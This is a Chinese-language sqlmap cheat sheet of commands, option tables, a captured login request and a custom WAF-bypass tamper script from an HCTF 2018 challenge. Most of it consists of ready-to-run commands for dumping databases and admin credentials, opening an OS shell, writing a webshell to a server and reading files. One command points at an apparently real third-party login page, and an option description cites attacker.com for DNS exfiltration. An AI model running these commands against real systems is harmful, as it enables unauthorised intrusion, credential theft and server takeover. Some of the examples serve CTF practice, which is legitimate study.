[手把手教你编写 SQLMap 的 Tamper 脚本过狗](https://mp.weixin.qq.com/s/2Nw1CbXsrEz0sM3GbOo68g)
[最新SQLMap进阶技术](https://mp.weixin.qq.com/s/xJgS2HYLVRmX1TuTEwHZCg)

# sqlmap

https://blog.csdn.net/Litbai_zhang/article/details/87939785

自写脚本
https://www.cnblogs.com/afanti/p/9949660.html
https://xz.aliyun.com/t/3245#toc-4

测试 post 注入

```sh
sqlmap -u http://vip.fj0730.cn/login.asp --forms
sqlmap -u http://url.php?id=1 --current-db --batch
sqlmap -u http://url.php?id=1 --current-user
sqlmap -u http://url.php?id=1 --dbs # all databases
sqlmap -u http://url.php?id=1 --is-dba
sqlmap -u http://url.php?id=1 -D test --tables           # 得到admin
sqlmap -u http://url.php?id=1 -D test -T admin --columns # 得到admin,pass
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
sqlmap -u http://url.php?id=1 --os-shell
sqlmap -u http://url/jsrpc.php?profileIdx2= -p "profileIdx2" --dbs # -p 注入参数名
--priviledges # 用户权限

sqlmap -r b.txt --passwords --batch     # bp抓包保存为 b.txt
sqlmap -r Filename.txt --dbs --level=3
sqlmap -l log.txt                       # 使用 bp log文件 （勾选上options中的Misc中的proxy）

sqlmap -u "<url>" --is-dba #  检测有无dba权限可写入

sqlmap.py -d "mysql://user:pass@host:port/<dbname>"  # 连接数据库
sqlmap.py -u "<url>" -safefreq # 延时注入
sqlmap.py -u "<url>" --delay 1 # 延时注入
sqlmap.py -u "<url>" --file-write "./mst.txt" --file-dest "d:/www/1.html" # 写入Webshell,  --file-write 本地文件路径, --file-dest 目标文件地址
sqlmap.py -u "<url>" --tamper="randomcase.py" # 使用Tamper脚本
sqlmap.py -m url_list.txt      # 批量检测SQL注入, 每行一个
sqlmap.py -l burp.log --batch -smart # 对burp.log中保存的所有 reqest进行注入扫描, burp设置： Logger: On, √上Proxy或其他
```

## manual

[SQLMap 命令详解及使用操作](https://blog.csdn.net/yinghua1234/article/details/105999231?utm_source=app)

[tamper](https://securityonline.info/sqlmap-tamper-script-bypassing-waf/)

```sh
# POST: 将请求保存成3.txt
sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment
sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment -D injection -T admin --dump
sqlmap -u url --search -C "flag"
sqlmap -u url --file-read="/flag"

sqlmap -u http://可能注入的某个提交参数的url --cookie="这次提交的cookie"
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" --current-db --batch # database
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 --tables     # tables
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag --columns # columns
sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag -C flag --dump # dump data
```

--technique

指定 sqlmap 使用的检测技术，默认情况下会测试所有的方式。

Boolean-based blind, Error-based, Union query-based, Stacked queries(对文件系统、操作系统、注册表操作时，必须指定该方式), Time-based blind

| Params         | Description                                                                                                                                                                                               |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| --time-sec     | 延迟时间，时间盲注默认 5 秒                                                                                                                                                                               |
| --union-cols   | 联合查询时默认是 1-10 列，当 level=5 时会增加到测试 50 个字段数，可以使用此参数设置查询的字段数。                                                                                                         |
| --union-char   | 默认情况下 sqlmap 针对 UNION 查询的注入会使用 NULL 字符；有些情况下使用 NULL 字符会造成页面返回失败，而使用一个随机整数是成功的，可以使用--union-char 指定 UNION 查询的字符。                             |
| --dns-domain   | 攻击者控制了某 DNS 服务器，使用此功能可以提高数据查询的速度 如：--dns-domain="attacker.com"                                                                                                               |
| --second-order | 有些时候注入点输入的数据，返回的结果并不是当前页面，而是另外一个页面。使用此参数指定到哪个页面获取响应判断真假，--second-order 后面跟一个判断页面的 URL 地址。例如：--second-order="http://1.1.1.1/a.php" |

[SQLMap 中 tamper 的简介](https://blog.csdn.net/Litbai_zhang/article/details/99681398)

## level, risk

| param         | 默认值 | 说明                 |
| ------------- | ------ | -------------------- |
| --level=(1-5) | 1      | 要执行的测试水平等级 |
| --reisk=(0-3) | 1      | 测试执行的风险等级   |

- 探测等级 :-level
  - payload 可以在 xml/payloads/ 中看到,你也可以根据相应的格式添加自己的 payload.
    这个参数不仅影响使用哪些 payload 同时也会影响测试的注入点, GET 和 POST 的数据都会测试,
  - 2 测试 HTTP Cookie
  - 3 测试 HTTP User-Agent/Referer 头
  - 总之在你不确定哪个 payload 或者参数为注入点的时候,为了保证全面性,建议使用高的 level 值.
- 风险等级 :-risk
  - 1 会测试大部分的测试语句,
  - 2 会增加基于事件的测试语句
  - 3 会增加 OR 语句的 SQL 注入测试.
  - 在有些时候,例如在 UPDATE 的语句中,注入一个 OR 的测试语句,可能导致更新的整个表,可能造成很大的风险.
    测试的语句同样可以在 xml/payloads/,中找到,你也可以自行添加 payload.

### 文件夹说明, -v 显示载荷学习 payload

| 目录        | 说明                                                                     |
| ----------- | ------------------------------------------------------------------------ |
| doc/        | 具体使用说明,例如多种语言的简要说明、PDF 版的详细说明、FAQ、作者信息等.  |
| extra/      | 多种额外功能,例如发出声响 (beep)、运行 cmd、安全执行、shellcode 等.      |
| Iib/        | 多种连接库,如五种注入类型请求的参数、提权操作等.                         |
| plugins/    | 各种数据库的信息和数据库通用事项.                                        |
| procs/      | mssqlserver、mysql、. Oracle 和 postgresql 的触发程序                    |
| shell/      | 多种注入成功后的多种 shell 远程连接命令执行和管理数据库                  |
| tamper/     | 绕过脚本,例如编码绕过、注释绕过等.                                       |
| thirdparty/ | 一些其他第三方的插件,例如优化、保持连接、颜色等.                         |
| txt/        | 一些字典,例如用户浏览器代理、表、列、关键词等.                           |
| udf/        | 用户自己定义的攻击载荷.                                                  |
| waf/        | 一些多种常见的防火墙特征.可以直接使用 --identify-waf 来进行检测.         |
| xml/        | 多种数据库的注入检测载荷、旗标信息以及其他信息.在这里可以看到进行注入的. |

-v 有 7 个等级,默认为 1:

| v 值 | 说明                             |
| ---- | -------------------------------- |
| 0    | 只显示 python 错误以及严重的信息 |
| 1    | 同时显示信息和警告信息 (默认)    |
| 2    | 同时显示 debug 的信息            |
| 3    | **重点：同时显示注入的 payload** |
| 4    | 同时显示 HTTP 请求               |
| 5    | 同时显示 HTTP 响应头             |
| 6    | 同时显示 HTTP 响应页面           |

或者用 --proxy=http://ip:port 来配合 burp 抓包学习

## sqlmap 脚本

a.txt:

```python
POST /admin/list.php HTTP/1.1
Host: kzone.2018.hctf.io
Content-Length: 33
Cache-Control: max-age=0
Origin: http://kzone.2018.hctf.io
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Referer: http://kzone.2018.hctf.io/admin/login.php
Accept-Encoding: gzip, deflate
X-Forwarded-For: 127.0.1.3,1,2,3,4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: PHPSESSID=7notm2n004aen7oln00ohd9ei3; islogin=1; login_data=*
Connection: close

user=rr123&pass=rr123&login=Login
```

Command:

`python sqlmap.py -r a.txt --tamper=hctf --dbs --dbms=mysql --thread=10 -D hctf_kouzone -T F1444g -C F1a9 --dump -v3`

tamper/hctf.py

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    data = '''{"admin_user":"%s"};'''
    payload = payload.lower()

    payload = payload.replace('u', '\u0075')
    payload = payload.replace('o', '\u006f')
    payload = payload.replace('i', '\u0069')
    payload = payload.replace('\'', '\u0027')
    payload = payload.replace('\"', '\u0022')
    payload = payload.replace(' ', '\u0020')
    payload = payload.replace('s', '\u0073')
    payload = payload.replace('#', '\u0023')
    payload = payload.replace('>', '\u003e')
    payload = payload.replace('<', '\u003c')
    payload = payload.replace('-', '\u002d')
    payload = payload.replace('=', '\u003d')
    payload = payload.replace('f1a9', 'F1a9')
    payload = payload.replace('f1', 'F1')
    return data % payload
```

## technique

--technique=T 基于时间盲注
